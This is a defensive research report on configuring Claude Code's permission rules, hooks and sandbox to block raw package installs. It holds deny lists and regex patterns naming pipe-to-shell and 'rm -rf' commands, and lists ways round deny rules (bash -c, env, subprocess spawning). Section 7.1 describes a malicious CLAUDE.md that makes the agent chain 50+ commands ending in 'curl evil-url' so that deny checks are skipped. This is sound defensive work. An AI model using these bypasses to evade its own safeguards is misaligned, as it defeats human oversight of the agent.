# Permission Settings & Command Allowlists/Denylists Research

## Overview

This report covers Claude Code's permission system in depth: the settings.json structure, rule syntax and matching semantics, the settings hierarchy, permission modes, how to deny raw package install commands while allowing approved wrappers, MCP tool permissions, edge cases and known vulnerabilities, and practical security-focused configurations.

## 1. Permission System Architecture

### 1.1 Rule Categories

Claude Code's permission system uses three rule arrays in `settings.json`:

- **`permissions.allow`** -- tool calls matching these rules execute without prompting the user.
- **`permissions.ask`** -- tool calls matching these rules prompt for confirmation every time.
- **`permissions.deny`** -- tool calls matching these rules are blocked outright. Claude receives feedback that the action was denied.

### 1.2 Evaluation Order: Deny > Ask > Allow

Rules are evaluated in strict order: **deny first, then ask, then allow**. The first matching rule wins. This means:

- A deny rule **always** takes precedence over an allow rule, regardless of where each appears in the JSON or which settings file defines them.
- If no rule matches, the behavior depends on the active permission mode (see Section 4).

This is enforced by Claude Code itself, not by the model. CLAUDE.md instructions shape what Claude *tries* to do, but permission rules control what Claude Code *allows*. This distinction is critical: prompt-level instructions are advisory; permission rules are enforcement.

### 1.3 Rule Syntax

Rules follow the format `Tool` or `Tool(specifier)`:

| Rule | Effect |
|------|--------|
| `Bash` or `Bash(*)` | Matches ALL Bash commands |
| `Bash(npm run build)` | Matches exact command `npm run build` |
| `Bash(npm run *)` | Matches commands starting with `npm run ` |
| `Bash(* install)` | Matches commands ending with ` install` |
| `Bash(git * main)` | Matches commands like `git checkout main`, `git push origin main` |
| `WebFetch(domain:example.com)` | Matches web fetches to example.com |
| `Read(./.env)` | Matches reading .env in current directory |
| `mcp__server__tool` | Matches specific MCP tool |

### 1.4 Wildcard Semantics

The `*` glob matches **any sequence of characters including spaces**, so a single `*` can span multiple arguments:

- `Bash(git *)` matches `git log --oneline --all`
- `Bash(git * main)` matches `git push origin main` AND `git merge main`

**Word boundary behavior**: The space before `*` matters:
- `Bash(ls *)` matches `ls -la` but NOT `lsof` (space enforces word boundary)
- `Bash(ls*)` matches BOTH `ls -la` and `lsof` (no word boundary)

**The `:*` suffix** is equivalent to a trailing ` *`, so `Bash(ls:*)` = `Bash(ls *)`. However, `:*` is only recognized at the end of a pattern. In `Bash(git:* push)`, the colon is literal.

### 1.5 Compound Command Handling

Claude Code is **shell-operator-aware**. It recognizes `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines as command separators. Each subcommand is matched independently against permission rules.

**Critical implication**: A rule like `Bash(safe-cmd *)` does NOT give permission to run `safe-cmd && dangerous-cmd`. The `dangerous-cmd` portion is evaluated separately and must have its own matching allow rule.

When a user manually approves a compound command with "Yes, don't ask again", Claude Code saves separate rules for each subcommand (up to 5 rules per compound command).

### 1.6 Process Wrapper Stripping

Before matching, Claude Code strips a fixed set of process wrappers:

**Stripped (built-in, not configurable)**: `timeout`, `time`, `nice`, `nohup`, `stdbuf`, bare `xargs` (without flags)

So `Bash(npm test *)` also matches `timeout 30 npm test`.

**NOT stripped**: `direnv exec`, `devbox run`, `mise exec`, `npx`, `docker exec`. These environment runners execute their arguments, so a rule like `Bash(devbox run *)` matches whatever comes after `run`, including `devbox run rm -rf .`. Write specific rules like `Bash(devbox run npm test)` instead.

**Always prompt**: `watch`, `setsid`, `ionice`, `flock`, and `find` with `-exec` or `-delete` always prompt and cannot be auto-approved by prefix rules.

### 1.7 Read-Only Commands (Auto-Approved)

A built-in, non-configurable set of commands is always auto-approved: `ls`, `cat`, `head`, `tail`, `grep`, `find`, `wc`, `diff`, `stat`, `du`, `cd`, and read-only forms of `git`. To require a prompt for one of these, add an explicit `ask` or `deny` rule.

## 2. Settings Hierarchy and Precedence

### 2.1 Settings Scopes (Highest to Lowest Priority)

| Priority | Scope | Location | Override-able? |
|----------|-------|----------|----------------|
| 1 (highest) | **Managed** | Server-managed, MDM/plist/registry, or `/etc/claude-code/managed-settings.json` (Linux) | NO -- cannot be overridden by anything |
| 2 | **CLI arguments** | `--allowedTools`, `--disallowedTools`, `--permission-mode` | Session-only |
| 3 | **Local project** | `.claude/settings.local.json` | N/A (most specific non-managed) |
| 4 | **Shared project** | `.claude/settings.json` | Yes, by local |
| 5 (lowest) | **User** | `~/.claude/settings.json` | Yes, by project or local |

### 2.2 Key Precedence Rules

- **If a tool is denied at ANY level, no other level can allow it.** A managed deny cannot be overridden by `--allowedTools`. A project deny overrides a user allow.
- Permission arrays (`allow`, `ask`, `deny`) from all scopes are **concatenated and de-duplicated**, then evaluated in deny-first order.
- The `--disallowedTools` CLI flag can ADD restrictions beyond managed settings, but cannot remove them.

### 2.3 Managed Settings: Non-Overridable Enforcement

For organizations needing centralized, mandatory control:

**Managed settings delivery on Linux**: `/etc/claude-code/managed-settings.json` with optional `managed-settings.d/` drop-in directory (files sorted alphabetically, later files override earlier for scalars, arrays concatenate).

**Critical managed-only settings for package guardrails**:

| Setting | Effect |
|---------|--------|
| `allowManagedPermissionRulesOnly` | When `true`, prevents user and project settings from defining ANY `allow`, `ask`, or `deny` rules. Only managed rules apply. |
| `allowManagedHooksOnly` | When `true`, only managed hooks and SDK hooks are loaded. User/project hooks blocked. |
| `allowManagedMcpServersOnly` | When `true`, only admin-defined MCP servers are allowed. |
| `disableBypassPermissionsMode` | Set to `"disable"` to prevent `bypassPermissions` mode entirely. Works from any scope but most useful in managed. |
| `disableAutoMode` | Set to `"disable"` to prevent auto mode. |

### 2.4 Making Deny Rules Truly Mandatory

To create deny rules that individual developers cannot override:

1. **Best option**: Place deny rules in managed settings (`/etc/claude-code/managed-settings.json` on Linux). These are highest precedence and immutable.
2. **Good option**: Place deny rules in shared project settings (`.claude/settings.json`, committed to git). These override user settings. A developer could add allows in `.claude/settings.local.json`, but deny rules from project settings still take precedence.
3. **Lock down completely**: Set `allowManagedPermissionRulesOnly: true` in managed settings to prevent ALL user/project permission rules.

## 3. Denying Package Install Commands

### 3.1 Comprehensive Deny Configuration

To block all raw package manager install commands:

```json
{
  "permissions": {
    "deny": [
      "Bash(npm install *)",
      "Bash(npm install)",
      "Bash(npm i *)",
      "Bash(npm i)",
      "Bash(npm add *)",
      "Bash(npm ci *)",
      "Bash(npm ci)",
      "Bash(npx *)",
      "Bash(yarn add *)",
      "Bash(yarn install *)",
      "Bash(yarn install)",
      "Bash(pnpm add *)",
      "Bash(pnpm install *)",
      "Bash(pnpm install)",
      "Bash(bun add *)",
      "Bash(bun install *)",
      "Bash(bun install)",
      "Bash(pip install *)",
      "Bash(pip3 install *)",
      "Bash(python -m pip install *)",
      "Bash(python3 -m pip install *)",
      "Bash(pipx install *)",
      "Bash(uv pip install *)",
      "Bash(uv add *)",
      "Bash(cargo add *)",
      "Bash(cargo install *)",
      "Bash(go get *)",
      "Bash(go install *)",
      "Bash(gem install *)",
      "Bash(bundle install *)",
      "Bash(bundle add *)",
      "Bash(composer require *)",
      "Bash(nix-env -i *)",
      "Bash(nix profile install *)",
      "Bash(apt install *)",
      "Bash(apt-get install *)",
      "Bash(brew install *)",
      "Bash(pacman -S *)",
      "Bash(curl * | bash *)",
      "Bash(curl * | sh *)",
      "Bash(wget * | bash *)",
      "Bash(wget * | sh *)"
    ],
    "allow": [
      "Bash(./scripts/safe-install *)",
      "Bash(./.claude/hooks/safe-install.sh *)",
      "Bash(npm run *)",
      "Bash(npm test *)",
      "Bash(npm run build *)"
    ]
  }
}
```

### 3.2 Allowing Approved Wrapper Scripts

Since deny rules take precedence, the allow rules for wrapper scripts work because they match a **different command** (e.g., `./scripts/safe-install npm axios` does not match `Bash(npm install *)` -- it matches `Bash(./scripts/safe-install *)`).

The wrapper script itself can then invoke the actual package manager after performing security checks. Claude Code's permission rules apply to the command Claude submits, not to subprocesses spawned by that command. So a wrapper script that internally calls `npm install` will work even though direct `npm install` is denied.

### 3.3 Gaps in Deny-Only Approach

**The deny list above is necessarily incomplete.** New package managers, aliases, and alternative invocations can bypass it:

- `Bash(python -c "import subprocess; subprocess.run(['pip', 'install', 'evil'])")` -- Python subprocess
- `Bash(node -e "require('child_process').execSync('npm install evil')")` -- Node subprocess
- `Bash(bash -c "npm install evil")` -- Shell wrapping (NOTE: `bash -c` is NOT in the process wrapper strip list)
- `Bash(env npm install evil)` -- env prefix
- `Bash(command npm install evil)` -- command builtin

This is why **deny rules alone are insufficient** for security-critical enforcement. They must be layered with hooks (Section 5) and sandboxing.

## 4. Permission Modes

### 4.1 Mode Overview

| Mode | What runs without asking | Package install implications |
|------|-------------------------|------------------------------|
| `default` | Reads only | All installs prompt (good for security) |
| `acceptEdits` | Reads + file edits + `mkdir`, `touch`, `mv`, `cp`, `rm`, `rmdir`, `sed` | Package installs still prompt |
| `plan` | Reads only | No execution at all |
| `auto` | Everything, with classifier review | Classifier may allow installs (see 4.2) |
| `dontAsk` | Only pre-approved tools | Only explicitly allowed installs work |
| `bypassPermissions` | Everything | All installs run (maximum risk) |

### 4.2 Auto Mode and Package Installs

Auto mode's classifier has specific behavior around packages:

**Allowed by default**: "Installing dependencies declared in your lock files or manifests." This means `npm ci` or `pip install -r requirements.txt` may be auto-approved.

**Dropped on entry to auto mode**: Broad allow rules including "package-manager run commands" and `Bash(python*)`. So even if you had `Bash(npm *)` in your allow list, it gets stripped when entering auto mode.

**The classifier blocks**: "Downloading and executing code, like `curl | bash`", "Trust boundary violations: running external code."

### 4.3 dontAsk Mode for CI/Scripted Environments

`dontAsk` is ideal for locked-down automation:
- Auto-denies everything not pre-approved
- Only `permissions.allow` rules and read-only commands execute
- Explicit `ask` rules are denied (not prompted)
- Fully non-interactive

Configure it as default for security-sensitive projects:

```json
{
  "permissions": {
    "defaultMode": "dontAsk",
    "allow": [
      "Bash(npm run *)",
      "Bash(./scripts/safe-install *)"
    ]
  }
}
```

### 4.4 Disabling Dangerous Modes

To prevent bypass mode: `"disableBypassPermissionsMode": "disable"` (works from any scope, but best in managed settings).

To prevent auto mode: `"disableAutoMode": "disable"`.

## 5. PreToolUse Hooks as Enforcement Layer

### 5.1 Why Hooks Are the Strongest Enforcement

Hooks provide the most robust enforcement because:

1. **A hook that exits code 2 blocks the tool call BEFORE permission rules are evaluated.** So a blocking hook stops execution even when an allow rule would otherwise permit it.
2. **Hooks run on the actual command string**, giving you programmatic access to inspect, parse, and validate the exact command being run.
3. **Hooks are deterministic** -- Claude cannot skip or override them. Unlike CLAUDE.md instructions which shape behavior but don't enforce it.
4. **Hooks can integrate external services** (vulnerability databases, Socket.dev, etc.) for real-time security checks.

### 5.2 Hook vs Permission Rule Interaction

The interaction is asymmetric and important:

- **Hook `deny` > Permission `allow`**: A hook returning `permissionDecision: "deny"` or exiting code 2 blocks the tool call even if an allow rule matches.
- **Permission `deny` > Hook `allow`**: A hook returning `permissionDecision: "allow"` does NOT override deny rules. The deny rule still blocks.
- **Hook `allow` skips prompts, but not rules**: The hook's allow just skips the interactive prompt. Deny and ask rules are still evaluated after.

This means the optimal strategy is: **use deny rules as a safety net, and hooks as the primary enforcement layer.**

### 5.3 Package Install Interceptor Hook

A PreToolUse hook that blocks raw package installs and requires a wrapper:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/package-guard.sh"
          }
        ]
      }
    ]
  }
}
```

Example `package-guard.sh`:

```bash
#!/bin/bash
# Reads JSON from stdin, checks if the command is a raw package install
INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command')

# List of package install patterns to block
BLOCKED_PATTERNS=(
  "^npm install"
  "^npm i "
  "^npm i$"
  "^npm add"
  "^npm ci"
  "^npx "
  "^yarn add"
  "^yarn install"
  "^pnpm add"
  "^pnpm install"
  "^bun add"
  "^bun install"
  "^pip install"
  "^pip3 install"
  "^python[23]? -m pip install"
  "^uv pip install"
  "^uv add"
  "^cargo add"
  "^cargo install"
  "^go get"
  "^go install"
  "^gem install"
  "^brew install"
  "^apt install"
  "^apt-get install"
)

for pattern in "${BLOCKED_PATTERNS[@]}"; do
  if echo "$COMMAND" | grep -qE "$pattern"; then
    echo "BLOCKED: Direct package installation not allowed. Use ./scripts/safe-install instead." >&2
    echo "Example: ./scripts/safe-install npm axios" >&2
    exit 2
  fi
done

# Also check for pipe-to-shell patterns
if echo "$COMMAND" | grep -qE "(curl|wget).*\|.*(bash|sh|zsh)"; then
  echo "BLOCKED: Pipe-to-shell execution is not allowed." >&2
  exit 2
fi

exit 0
```

### 5.4 The `if` Field for Efficient Filtering (v2.1.85+)

Instead of spawning the hook script for every Bash command, use the `if` field to pre-filter:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "if": "Bash(npm *)",
            "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/package-guard.sh"
          },
          {
            "type": "command",
            "if": "Bash(pip *)",
            "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/package-guard.sh"
          },
          {
            "type": "command",
            "if": "Bash(cargo *)",
            "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/package-guard.sh"
          }
        ]
      }
    ]
  }
}
```

Note: The hook still fires when commands are too complex to parse into subcommands, which is desirable for security.

### 5.5 Existing Plugin: attach-guard

The `attach-guard` Claude Code plugin demonstrates a production implementation of this pattern:

- Uses PreToolUse hooks to intercept install commands
- Queries Socket.dev's supply chain API for risk scores
- Blocks packages scoring below 50/100, flags 50-70
- Supports npm, pip, Go, and Cargo
- Suggests the newest safe version instead of just blocking
- MIT licensed, free Socket.dev tier available

## 6. MCP Tool Permissions

### 6.1 MCP Permission Syntax

MCP tools use the format `mcp__<server-name>__<tool-name>`:

```json
{
  "permissions": {
    "allow": [
      "mcp__github__list_pull_requests",
      "mcp__github__get_pull_request"
    ],
    "deny": [
      "mcp__filesystem__write_file",
      "mcp__github__merge_pull_request"
    ]
  }
}
```

Wildcards work: `mcp__puppeteer__*` matches all tools from the puppeteer server.

### 6.2 MCP Server-Level Controls

Beyond individual tool permissions, you can control which MCP servers are loaded:

- `enableAllProjectMcpServers: true` -- DANGEROUS, auto-approves all discovered servers
- `enabledMcpjsonServers: ["github", "memory"]` -- explicit allowlist
- `disabledMcpjsonServers: ["filesystem"]` -- explicit blocklist
- `allowedMcpServers` (managed only) -- admin allowlist
- `deniedMcpServers` (managed only) -- admin blocklist
- `allowManagedMcpServersOnly` (managed only) -- only admin-defined servers allowed

### 6.3 MCP and Package Installation

A custom MCP server could provide a `safe_install` tool that wraps package installation with security checks. The advantage over a Bash wrapper: Claude interacts with it as a first-class tool with typed inputs, not a shell command. You could deny all `Bash(npm install *)` patterns and provide `mcp__package_security__install` as the only approved installation path.

## 7. Edge Cases and Known Vulnerabilities

### 7.1 The 50-Subcommand Bypass (CVE-like, Patched v2.1.90)

**Severity**: High
**Status**: Patched in v2.1.90 (April 4, 2026)

Prior to v2.1.90, Claude Code had a hardcoded `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50` in `bashPermissions.ts`. When a compound command exceeded 50 subcommands, all deny rule enforcement was silently skipped and the system fell back to a generic "too many to safety-check" prompt.

**Attack vector**: A malicious CLAUDE.md file instructs Claude to generate 50+ chained no-op commands (`true && true && ... && curl evil-url`). In `bypassPermissions` or reflexive-approval scenarios, the denied command executes.

**Fix**: Anthropic deployed the already-existing tree-sitter parser and changed the fallback behavior from "ask" to "deny".

**Current status**: Patched, but demonstrates that deny rules have had enforcement gaps in production.

### 7.2 Deny Rules Not Enforced (Issue #6699, v1.0.93)

In August 2025, all deny rules in settings.json were completely non-functional in v1.0.93. Every deny rule was silently ignored. This was patched, but the existence of this bug reinforces the need for defense-in-depth.

### 7.3 Local Settings Deny Bypass (Issue #8961)

A separate report indicated deny rules in `.claude/settings.local.json` were being ignored, allowing Claude to read and modify files that should have been blocked. Status unclear.

### 7.4 Alternative Syntax / Shell Escapes

Deny rules match the **literal command string** Claude submits to the Bash tool. They do NOT inspect:

- Subprocesses spawned by allowed commands (a Python script calling `subprocess.run(["pip", "install", ...])`)
- Shell builtins used as wrappers (`bash -c "npm install evil"`, `command npm install evil`, `env npm install evil`)
- Variable expansion (`PKG=evil && npm install $PKG` -- the deny rule sees the literal `$PKG`, not its expansion)
- Heredocs, process substitution, or other complex shell constructs

**Mitigations**:
- PreToolUse hooks can inspect and regex-match much more flexibly than glob patterns
- OS-level sandboxing restricts what subprocesses can actually do
- Network domain allowlists in sandbox settings restrict outbound connections

### 7.5 Read/Edit Deny vs Bash Bypass

Denying `Read(./.env)` prevents Claude's Read tool from accessing `.env`, but does NOT prevent `Bash(cat .env)`. You must deny BOTH the tool access and the Bash equivalent for complete protection. However, Claude Code does recognize some Bash file commands (`cat`, `head`, `tail`, `sed`) and applies Read/Edit deny rules to them. Arbitrary subprocesses (Python, Node) that read files are not covered.

### 7.6 Pattern Fragility Warning (Official)

The official documentation explicitly warns that Bash patterns constraining arguments are fragile:

- `Bash(curl http://github.com/ *)` won't match `curl -X GET http://github.com/...` (options before URL), `curl https://github.com/...` (different protocol), or `URL=http://github.com && curl $URL` (variables).

## 8. Sandboxing as Defense-in-Depth

### 8.1 How Sandboxing Complements Permissions

Permissions control what Claude Code *attempts*. Sandboxing (OS-level) controls what Bash commands can *actually access*, even if they somehow bypass permission checks (e.g., via prompt injection).

```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "filesystem": {
      "denyRead": ["~/.ssh/**", "~/.aws/**", "~/.gnupg/**"],
      "allowWrite": ["."]
    },
    "network": {
      "allowedDomains": [
        "registry.npmjs.org",
        "pypi.org",
        "crates.io",
        "proxy.golang.org"
      ]
    }
  }
}
```

With `autoAllowBashIfSandboxed: true` (the default), sandboxed Bash commands run without per-command prompting -- the sandbox boundary replaces the prompt. **Explicit deny rules still apply.**

### 8.2 Network Domain Restrictions

Sandbox network settings can restrict which domains package managers can reach:

- `allowedDomains`: only these domains are reachable
- `deniedDomains`: these domains are blocked (takes precedence over allowed)
- `allowManagedDomainsOnly` (managed only): only admin-defined domains work

This is a powerful layer: even if a malicious package tries to phone home during a postinstall script, the sandbox blocks the connection if the destination isn't in the allowlist.

## 9. Recommended Security Configuration

### 9.1 Defense-in-Depth Strategy (Three Layers)

**Layer 1: Deny Rules** -- Catch the obvious cases. Fast, simple, but bypassable.

**Layer 2: PreToolUse Hooks** -- Programmatic enforcement with regex matching, external API integration. Strongest tool-level control.

**Layer 3: OS Sandbox** -- Restricts what subprocesses can actually do. Catches everything Layer 1 and 2 miss.

### 9.2 Complete Recommended Configuration

For `.claude/settings.json` (shared with team):

```json
{
  "permissions": {
    "defaultMode": "default",
    "disableBypassPermissionsMode": "disable",
    "deny": [
      "Bash(npm install *)", "Bash(npm install)",
      "Bash(npm i *)", "Bash(npm i)",
      "Bash(npm add *)", "Bash(npm ci *)", "Bash(npm ci)",
      "Bash(npx *)",
      "Bash(yarn add *)", "Bash(yarn install *)", "Bash(yarn install)",
      "Bash(pnpm add *)", "Bash(pnpm install *)", "Bash(pnpm install)",
      "Bash(bun add *)", "Bash(bun install *)", "Bash(bun install)",
      "Bash(pip install *)", "Bash(pip3 install *)",
      "Bash(python -m pip install *)", "Bash(python3 -m pip install *)",
      "Bash(uv pip install *)", "Bash(uv add *)",
      "Bash(cargo add *)", "Bash(cargo install *)",
      "Bash(go get *)", "Bash(go install *)",
      "Bash(gem install *)", "Bash(brew install *)",
      "Bash(curl * | bash *)", "Bash(curl * | sh *)",
      "Bash(wget * | bash *)", "Bash(wget * | sh *)",
      "Read(./.env)", "Read(./.env.*)", "Read(./secrets/**)",
      "Bash(git push --force *)", "Bash(git push * --force)",
      "Bash(rm -rf *)", "Bash(git reset --hard *)"
    ],
    "allow": [
      "Bash(./scripts/safe-install *)",
      "Bash(npm run *)", "Bash(npm test *)",
      "Bash(git status)", "Bash(git diff *)",
      "Bash(git add *)", "Bash(git commit *)", "Bash(git log *)",
      "Bash(* --version)", "Bash(* --help *)"
    ]
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/package-guard.sh"
          }
        ]
      }
    ]
  },
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "network": {
      "allowedDomains": [
        "registry.npmjs.org",
        "pypi.org",
        "crates.io",
        "proxy.golang.org",
        "github.com",
        "*.githubusercontent.com"
      ]
    }
  }
}
```

### 9.3 For Managed (Non-Overridable) Enforcement

In `/etc/claude-code/managed-settings.json`:

```json
{
  "permissions": {
    "disableBypassPermissionsMode": "disable",
    "deny": [
      "Bash(curl * | bash *)", "Bash(curl * | sh *)",
      "Bash(wget * | bash *)", "Bash(wget * | sh *)"
    ]
  },
  "allowManagedPermissionRulesOnly": false,
  "disableAutoMode": "disable"
}
```

Set `allowManagedPermissionRulesOnly: true` for maximum lockdown (prevents all user/project permission rules).

## 10. Depth Checklist

- [x] **Underlying mechanism explained**: Permission rule syntax, evaluation order (deny > ask > allow), enforcement by harness not model, compound command decomposition, process wrapper stripping, glob matching semantics.
- [x] **Key tradeoffs and limitations**: Deny rules are necessary but insufficient alone (bypassable via subprocess spawning, shell wrapping, variable expansion). Hooks are strongest tool-level enforcement but add latency. Sandboxing is most thorough but limits legitimate operations.
- [x] **Compared to alternatives**: Three enforcement layers compared (deny rules vs hooks vs sandbox). Permission modes compared (default, dontAsk, auto, bypass). attach-guard plugin as reference implementation.
- [x] **Failure modes and edge cases**: 50-subcommand bypass (patched v2.1.90), historical deny-rule non-enforcement (v1.0.93), shell escape patterns, Read-vs-Bash deny gaps, pattern fragility for argument-constrained rules.
- [x] **Concrete examples**: Complete JSON configurations for deny lists, hooks, sandbox. Working package-guard.sh script. attach-guard plugin as production reference.
- [x] **Standalone readable**: Full decision basis without needing to consult original sources.

## Sources

All sources saved to `docs/`:
- `official-configure-permissions.md` -- [Claude Code permissions docs](https://code.claude.com/docs/en/permissions)
- `official-permission-modes.md` -- [Permission modes docs](https://code.claude.com/docs/en/permission-modes)
- `official-settings-reference.md` -- [Settings reference](https://code.claude.com/docs/en/settings)
- `official-hooks-guide.md` -- [Hooks guide](https://code.claude.com/docs/en/hooks-guide)
- `anthropic-auto-mode-engineering.md` -- [Auto mode engineering deep dive](https://www.anthropic.com/engineering/claude-code-auto-mode)
- `five-permission-patterns-lockdown.md` -- [5 permission patterns (DEV Community)](https://dev.to/klement_gunndu/lock-down-claude-code-with-5-permission-patterns-4gcn)
- `adversa-deny-rules-bypass-vulnerability.md` -- [Deny rules bypass vulnerability (Adversa)](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/)
- `register-deny-rules-bypass-news.md` -- [The Register coverage of bypass](https://www.theregister.com/2026/04/01/claude_code_rule_cap_raises/)
- `backslash-security-best-practices.md` -- [Security best practices (Backslash)](https://www.backslash.security/blog/claude-code-security-best-practices)
- `attach-guard-package-plugin.md` -- [Package security plugin (DEV Community)](https://dev.to/hammadtariq/i-built-a-claude-code-plugin-that-blocks-compromised-packages-before-installation-1o3l)
